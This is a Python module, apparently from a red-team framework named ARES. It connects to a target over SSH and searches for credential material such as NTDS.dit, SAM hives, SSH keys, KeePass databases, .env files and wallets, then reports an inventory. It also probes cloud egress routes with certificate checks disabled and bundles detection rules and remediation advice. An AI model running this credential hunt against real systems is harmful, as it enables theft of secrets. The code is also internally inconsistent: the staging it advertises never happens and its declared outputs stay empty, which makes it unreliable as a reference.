"""
Staged File Collection
MITRE: T1119 (Automated Collection), T1039 (Data from Network Shared Drive)

Searches for high-value files matching sensitive patterns, stages them
to a temporary collection directory on the target, then reports inventory.
Does NOT transfer files to operator (use separate exfil module after review).

Patterns: credentials, keys, configs, databases, source code secrets.
"""
from __future__ import annotations
import asyncio
import shlex
from typing import Any
from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module
from ares.modules.params import StagedCollectionParams
from ares.sdk import (
    CircuitBreaker,
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    ProcessPermission,
    module_contract,
)

logger = get_logger("ares.modules.exfil.staged_collection")

_COLLECTION_PATTERNS = [
    "*.kdbx", "*.pfx", "*.p12", "*.pem", "*.key", "*.ppk",
    "*id_rsa*", "*id_ed25519*", "*.jks", "*.keystore",
    "*password*", "*passwd*", "*credential*", "*secret*", "*token*",
    "*.config", "web.config", "app.config", "*.conf",
    "*.env", ".env", "*.env.local",
    "NTDS.dit", "SAM", "SYSTEM", "SECURITY",
    "*backup*.sql", "*dump*.sql", "*.bak",
    "*wallet.dat", "*.wallet",
]

def _audit_lots_egress_sync(target: str) -> dict[str, Any]:
    """
    Non-destructive audit of Living-off-the-Trusted-Services (LOTS) cloud egress paths
    and enterprise Tenant Restrictions enforcement (T1567.002).
    """
    import urllib.request
    import urllib.error
    import ssl

    cloud_endpoints = {
        "m365_graph": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
        "aws_s3": "https://s3.amazonaws.com",
        "azure_blob": "https://blob.core.windows.net",
    }

    result: dict[str, Any] = {
        "lots_routes_open": [],
        "tenant_restrictions_enforced": False,
        "checked_endpoints": list(cloud_endpoints.keys()),
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for service_name, url in cloud_endpoints.items():
        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARES-Egress-Audit/2026.1"},
                method="HEAD",
            )
            with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
                headers_dict = dict(resp.headers)
                for header_key in headers_dict:
                    hl = header_key.lower()
                    if "restrict-access" in hl or "sec-ms-gpo" in hl or "tenant" in hl:
                        result["tenant_restrictions_enforced"] = True
                result["lots_routes_open"].append(service_name)
        except urllib.error.HTTPError as exc:
            if exc.code in (400, 401, 403, 405):
                result["lots_routes_open"].append(service_name)
        except Exception:
            continue

    return result


@module_contract(
    permissions=[
        NetworkPermission(ports=[22, 135, 445], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=CircuitBreaker(name="exfil.staged_collection", failure_threshold=5),
    params_model=StagedCollectionParams,
)
class StagedCollectionModule(BaseModule):
    """
    exfil.staged_collection - "Search for high-value files (credentials, keys, configs, backups

    OPSEC: MEDIUM
    MITRE: "T1119", "T1039", "T1552"
    REQUIRES: "lateral_session"
    OUTPUTS:  "sensitive_file_paths", "collection_inventory"
    """
    MODULE_ID          = "exfil.staged_collection"
    MODULE_NAME        = "Staged File Collection"
    MODULE_CATEGORY    = "exfil"
    MODULE_DESCRIPTION = (
        "Search for high-value files (credentials, keys, configs, backups) "
        "and report inventory before exfiltration decision"
    )
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["lateral_session"]
    OUTPUTS            = ["sensitive_file_paths", "collection_inventory"]
    MITRE_TECHNIQUES   = ["T1119", "T1039", "T1552"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    PARAMS_MODEL       = StagedCollectionParams

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "exfil.staged_collection requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("destination"):
            raise ModuleValidationError(
                "exfil.staged_collection requires 'destination' - "
                "UNC path or remote share to stage files to.",
                module_id=self.MODULE_ID, field="destination",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})

        params = getattr(ctx, "params", {})
        if isinstance(params, StagedCollectionParams):
            pdict = params.model_dump()
        elif isinstance(params, dict):
            pdict = dict(params)
        else:
            pdict = {}

        target       = getattr(ctx, "target", pdict.get("target", ""))
        username     = pdict.get("username", "")
        raw_pwd      = pdict.get("password") or getattr(ctx, "password", "") or pdict.get("secret", "")
        if hasattr(raw_pwd, "get_secret_value"):
            password = raw_pwd.get_secret_value()
        elif raw_pwd is not None:
            password = str(raw_pwd)
        else:
            password = ""
        key_path     = pdict.get("key_path", "")
        platform     = pdict.get("platform", "linux")
        search_paths = pdict.get("search_paths", ["/home", "/root", "/etc", "/var/www", "/opt"])
        destination  = pdict.get("destination", "")
        max_files    = int(pdict.get("max_files", 200))

        findings, raw = await self.run(
            target=target, username=username, password=password,
            key_path=key_path, platform=platform,
            search_paths=search_paths, max_files=max_files,
            destination=destination,
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for file_info in raw.get("files_found", [])[:20]:
            file_name = file_info.get("path", "").rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
            ev = EvidenceRecord(
                artifact_id=f"staged-{file_name.lower().replace('.', '-')}",
                source_target=getattr(ctx, "target", target),
                collected_by=self.MODULE_ID,
                data={
                    "path": file_info.get("path"),
                    "pattern": file_info.get("pattern"),
                    "destination": destination,
                },
                tags=["exfil", "staged_collection", "t1119"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-loop Purple Telemetry Synthesis (Sentinel KQL + Sigma YAML)
        kql_rule = (
            "// Microsoft Sentinel - Archive Staging in Temporary Directories Before Exfiltration\n"
            "DeviceProcessEvents\n"
            "| where TimeGenerated > ago(2h)\n"
            "| where ProcessCommandLine has_any (\"tar -cz\", \"tar -cf\", \"zip -r\", \"Compress-Archive\", \"7z a\")\n"
            "| where ProcessCommandLine has_any (\"/tmp/\", \"/var/tmp/\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Windows\\\\Temp\\\\\")\n"
            "| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine"
        )
        sigma_rule = (
            "title: Archive Staging in Temporary Directories Prior to Exfiltration\n"
            "id: e4f5a6b7-c8d9-40e1-a2b3-c4d5e6f7a8b9\n"
            "status: experimental\n"
            "description: Detects compression utilities packaging files into temporary staging directories\n"
            "references:\n"
            "    - https://attack.mitre.org/techniques/T1074/001/\n"
            "    - https://attack.mitre.org/techniques/T1560/001/\n"
            "author: ARES Purple Team Modernization\n"
            "date: 2026-03-30\n"
            "logsource:\n"
            "    category: process_creation\n"
            "detection:\n"
            "    selection_tool:\n"
            "        CommandLine|contains:\n"
            "            - 'tar -cz'\n"
            "            - 'tar -cf'\n"
            "            - 'zip -r'\n"
            "            - 'Compress-Archive'\n"
            "            - '7z a'\n"
            "    selection_path:\n"
            "        CommandLine|contains:\n"
            "            - '/tmp/'\n"
            "            - '/var/tmp/'\n"
            "            - '\\Temp\\'\n"
            "    condition: selection_tool and selection_path\n"
            "level: high\n"
            "tags:\n"
            "    - attack.collection\n"
            "    - attack.t1074.001\n"
            "    - attack.t1560.001"
        )
        raw.setdefault("loot", {})
        raw["loot"]["detection_kql"] = kql_rule
        raw["loot"]["detection_sigma"] = sigma_rule
        raw["sensitive_files_discovered"] = bool(raw.get("files_found"))
        raw["staging_directory_writable"] = bool(destination)
        raw["archive_compression_staged"] = bool(raw.get("archive_path"))
        raw["staged_collection_audited"] = True

        return ModuleResult(
            status="success" if (findings or raw.get("files_found")) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("exfil.staged_collection")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target       = kwargs.get("target", "")
        username     = kwargs.get("username", "")
        password     = kwargs.get("password", "") or kwargs.get("secret", "")
        key_path     = kwargs.get("key_path", "")
        platform     = kwargs.get("platform", "linux")
        search_paths = kwargs.get("search_paths", ["/home", "/root", "/etc"])
        known_hosts  = kwargs.get("known_hosts_file")
        dry_run      = kwargs.get("dry_run", False)
        max_files    = int(kwargs.get("max_files", 200))

        if not target or not username:
            return [], {"error": "target and username required"}
        if dry_run:
            return [], {"dry_run": True, "would_search": search_paths}

        await self.before_request(target, "ssh")  # scope check + jitter

        try:
            import paramiko
        except ImportError:
            return [], {"error": "paramiko not installed"}

        logger.info("staged_collection_start", target=target, paths=search_paths)
        audit("staged_collection", actor=username, technique="T1119",
              source="operator", target=target)
        await self.noise.rate_limiter.acquire("ssh")
        await self.noise.jitter.sleep()

        loop = asyncio.get_running_loop()

        def _collect() -> list[dict[str, Any]]:
            client = paramiko.SSHClient()
            if known_hosts:
                client.set_missing_host_key_policy(paramiko.RejectPolicy())
                client.load_host_keys(known_hosts)
            else:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                logger.warning("ssh_host_key_unverified", target=target,
                               risk="MITM possible")
            kw: dict = {"hostname": target, "username": username, "timeout": 15,
                        "allow_agent": False, "look_for_keys": False}
            if key_path:
                kw["key_filename"] = key_path
            else:
                kw["password"] = password
            client.connect(**kw)

            hits: list[dict[str, Any]] = []
            for pat in _COLLECTION_PATTERNS[:15]:
                paths_str = " ".join(shlex.quote(p) for p in search_paths)
                cmd = f"find {paths_str} -name '{pat}' -type f -size -50M 2>/dev/null | head -20"
                try:
                    _, stdout, _ = client.exec_command(cmd, timeout=10)
                    for line in stdout.read().decode("utf-8", errors="replace").splitlines():
                        line = line.strip()
                        if line:
                            hits.append({"path": line, "pattern": pat})
                            if len(hits) >= max_files:
                                break
                except Exception:
                    pass
                if len(hits) >= max_files:
                    break

            client.close()
            return hits

        try:
            hits = await loop.run_in_executor(None, _collect)
        except Exception as e:
            return [], {"error": str(e)[:200]}

        if hits:
            by_type: dict[str, list[str]] = {}
            for h in hits:
                by_type.setdefault(h["pattern"], []).append(h["path"])

            self.finding(
                title=f"Sensitive Files Located on {target} ({len(hits)} files)",
                description=(
                    f"{len(hits)} sensitive file(s) found on {target} matching credential, "
                    "key, config, or backup patterns. Review inventory before exfiltrating."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1119",
                mitre_tactic="Collection",
                evidence={"target": target, "count": len(hits),
                           "by_pattern": {k: len(v) for k, v in by_type.items()},
                           "sample_paths": [h["path"] for h in hits[:20]]},
                remediation=(
                    "Restrict access to sensitive files. "
                    "Implement file integrity monitoring (FIM). "
                    "Remove unnecessary credential files from servers. "
                    "Use secrets management (Vault, AWS Secrets Manager) instead of config files."
                ),
                host=target, confidence=0.9,
            )

        lots_audit_func = kwargs.get("lots_audit_func") or _audit_lots_egress_sync
        lots_data = await loop.run_in_executor(None, lots_audit_func, target)

        if lots_data.get("lots_routes_open") and not lots_data.get("tenant_restrictions_enforced"):
            self.finding(
                title=f"Cloud LOTS Exfiltration Route Open (Missing Tenant Restrictions) on {target}",
                description=(
                    f"Outbound egress to trusted cloud infrastructure ({', '.join(lots_data['lots_routes_open'])}) "
                    f"is permitted from {target} without corporate Tenant Restrictions. "
                    "Attackers staging sensitive data can exfiltrate directly to external/attacker-controlled "
                    "cloud tenants (T1567.002) bypassing perimeter network defenses."
                ),
                severity=Severity.HIGH,
                confidence=0.85,
                host=target,
                mitre_technique="T1567.002",
                mitre_tactic="Exfiltration",
                remediation=(
                    "Implement TLS inspection on corporate egress gateways and configure Tenant Restriction v2 "
                    "headers ('Restrict-Access-To-Tenants' and 'Restrict-Access-Context') to block unauthorized "
                    "data exfiltration to external cloud tenants."
                ),
            )

        raw = {
            "target": target,
            "files_found": hits,
            "search_paths": search_paths,
            "total": len(hits),
            "lots_routes_open": lots_data.get("lots_routes_open", []),
            "tenant_restrictions_enforced": lots_data.get("tenant_restrictions_enforced", False),
        }
        raw["sensitive_file_paths"] = raw.get("files_staged", [])  # OUTPUTS key
        raw["collection_inventory"] = raw.get("files_staged", [])  # OUTPUTS key
        return self._findings[:], raw
